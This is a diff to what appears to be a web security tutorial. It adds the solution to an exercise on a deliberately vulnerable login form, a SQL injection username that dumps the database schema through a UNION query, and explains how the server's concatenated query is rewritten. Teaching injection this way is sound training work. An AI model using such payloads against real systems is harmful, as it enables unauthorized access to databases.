@@ -61,7 +61,13 @@ The login form is still vulnerable. Focus on the username field. A single quote 
 <details>
   <summary>Solution for 6.1</summary>
 
-  With the username from the exercise, the login query becomes:
+  Log in with this username (any password):
+
+  ```sql
+  ' UNION ALL SELECT GROUP_CONCAT(sql) as id FROM sqlite_schema--
+  ```
+
+  The app pastes your username into its login query (`SELECT id FROM user WHERE username='<username>' AND password='<password>'`), so the query the database runs becomes the following. Don't type this in; it's what the server builds from your username:
 
   ```sql
   SELECT id FROM user WHERE username='' UNION ALL SELECT GROUP_CONCAT(sql) as id FROM sqlite_schema--' AND password=''
